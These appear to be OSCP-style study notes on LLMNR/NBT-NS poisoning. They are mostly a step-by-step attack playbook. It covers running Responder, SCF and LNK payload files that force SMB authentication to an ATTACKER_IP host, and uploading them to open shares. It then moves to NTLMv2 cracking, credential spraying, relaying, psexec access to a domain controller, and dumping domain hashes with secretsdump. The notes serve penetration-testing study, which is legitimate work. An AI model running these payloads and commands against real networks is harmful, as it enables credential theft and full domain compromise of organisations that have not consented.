# 📘 LLMNR & NBT-NS Poisoning — Complete Deep Notes (OSCP Level)

---

# SECTION 1: THE BASICS — Understanding the Foundation

## 1.1 What is DNS?

DNS (Domain Name System) is like a **phonebook of the network**.

When you type:

```bash
\\fileserver
```

System performs:

```bash
PC → DNS Server → IP Address → Connection
```

---

## 1.2 What is LLMNR?

LLMNR = **Link-Local Multicast Name Resolution**

Fallback protocol when DNS fails.

### Flow:

```bash
PC → DNS (fails)
PC → Broadcast (LLMNR) → "Who is FILESERVER01?"
Any system → replies
```

### Key Facts:

* UDP Port: **5355**
* Works on **local subnet only**
* Enabled by default (Windows)
* ❌ No authentication

---

## 1.3 What is NBT-NS?

NBT-NS = **NetBIOS Name Service**

### Key Facts:

* UDP Port: **137**
* Broadcast-based
* Legacy protocol
* ❌ No verification

---

## 1.4 Why LLMNR Exists?

* Small networks without DNS
* Auto device discovery

⚠️ In enterprise → **Unnecessary but still enabled**

---

## 1.5 Why LLMNR is Vulnerable?

* No authentication
* No trust validation
* Anyone can spoof response

---

# SECTION 2: NTLM & HASHES

## 2.1 What is Hash?

```bash
Password: Summer2024!
Hash:     a87f3b2c9d...
```

✔ One-way
✔ Can brute-force

---

## 2.2 NTLM Authentication Flow

```bash
1. Client → "I am USER"
2. Server → sends challenge
3. Client → computes response
4. Client → sends response
5. Server → verifies
```

---

## 2.3 What Attacker Captures

* Username
* Domain
* Challenge
* NTLMv2 Response

✔ Crackable
✔ Relayable

---

# SECTION 3: LLMNR POISONING

## Attack Flow

```bash
1. Victim → \\FILESERVER01 (wrong name)
2. DNS fails
3. LLMNR broadcast
4. Attacker replies (spoof)
5. Victim connects to attacker
6. NTLM authentication happens
7. Hash captured
```

---

# SECTION 4: ATTACK CONDITIONS

## Works When:

* Same subnet
* Windows system
* LLMNR enabled
* DNS failure occurs

## Fails When:

* LLMNR disabled
* Different network
* No traffic
* SMB signing enforced

---

# SECTION 5: ATTACK CHAIN

```bash
Outside → Initial Access → Internal Network → LLMNR Poisoning
→ Hash Capture → Crack / Relay → Lateral Movement → Domain Admin
```

---

# SECTION 6: FULL ATTACK FLOW

## Recon

```bash
nmap -sC -sV -p- <target>
```

## Enumeration

```bash
ipconfig /all
net user /domain
net group "Domain Admins" /domain
```

---

# SECTION 7: RESPONDER

## Installation

```bash
which responder
sudo apt update
sudo apt install responder -y
git clone https://github.com/lgandx/Responder
cd Responder
```

---

## Main Command

```bash
sudo responder -I tun0 -rdwv
```

---

## Flags

* `-I` → Interface
* `-r` → NetBIOS responses
* `-d` → Domain queries
* `-w` → WPAD
* `-v` → Verbose

---

## Interface

```bash
ip a
```

* tun0 → VPN network ✅
* eth0 → local network ❌

---

# SECTION 8: HASH CAPTURE FLOW

```bash
1. Victim typo
2. DNS fail
3. LLMNR broadcast
4. Attacker replies
5. Victim connects
6. SMB authentication
7. NTLMv2 hash captured
```

---

# SECTION 9: PAYLOADS (VERY IMPORTANT)

## 9.1 SCF FILE PAYLOAD (AUTO TRIGGER)

Create file: **@malicious.scf**

```bash
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

### Upload to Share:

```bash
smbclient //TARGET_IP/Share -U anonymous
put @malicious.scf
```

### Working:

* User opens folder
* Windows loads icon
* SMB request sent to attacker
* Hash captured

---

## 9.2 LNK FILE PAYLOAD

### Using Tool:

```bash
python3 lnkbomb.py -i ATTACKER_IP -o malicious.lnk
```

### Manual (PowerShell):

```bash
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("C:\temp\malicious.lnk")
$link.targetpath = "\\ATTACKER_IP\share\payload"
$link.save()
```

---

## 9.3 WPAD ATTACK

Run Responder with:

```bash
sudo responder -I tun0 -rdwv
```

### Working:

* Browser searches proxy automatically
* Attacker responds
* Browser sends NTLM credentials

---

## 9.4 FORCED AUTH VIA SMB PATH

Example:

```bash
\\ATTACKER_IP\share
```

Used in:

* Emails
* Scripts
* Social engineering

---

# SECTION 10: SCENARIOS

## Scenario 1: Normal

```bash
sudo responder -I tun0 -rdwv
```

Wait → hashes appear

---

## Scenario 2: No Traffic

```bash
crackmapexec smb 10.10.10.0/24 --shares -u '' -p ''

smbclient //10.10.10.50/Shared -N
put @malicious.scf
```

---

## Scenario 3: Pivot

```bash
powershell -ep bypass
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y
```

---

# SECTION 11: HASH EXPLOITATION

## Crack Hash

```bash
hashcat -m 5600 hash.txt rockyou.txt --force
```

---

## Validate Credentials

```bash
crackmapexec smb 10.10.10.0/24 -u user -p password
```

---

## Remote Access

```bash
evil-winrm -i TARGET_IP -u user -p password
```

---

## Pass-the-Hash / Relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

---

# SECTION 12: OSCP WALKTHROUGH

## Step 1: Scan

```bash
nmap -sC -sV -p 53,88,135,139,389,445 10.10.10.0/24
```

---

## Step 2: Start Responder

```bash
sudo responder -I tun0 -rdwv
```

---

## Step 3: Capture Hash

```bash
Username: CORP\jsmith
Hash: NTLMv2
```

---

## Step 4: Crack

```bash
hashcat -m 5600 jsmith.txt rockyou.txt
```

---

## Step 5: Use Credentials

```bash
crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Password123!'
```

---

## Step 6: Domain Compromise

```bash
python3 psexec.py CORP/jsmith:'Password123!'@DC_IP
```

---

## Step 7: Dump Hashes

```bash
python3 secretsdump.py CORP/jsmith:'Password123!'@DC_IP
```

---

# SECTION 13: TROUBLESHOOTING

## No Hash?

Check:

```bash
ip a
```

* Correct interface?
* Same network?
* LLMNR enabled?

---

## Common Mistakes

* Using eth0 instead of tun0
* No traffic generated
* Wrong subnet

---

# 📝 CUSTOM NOTES

Enter topic:

```bash
__________
```
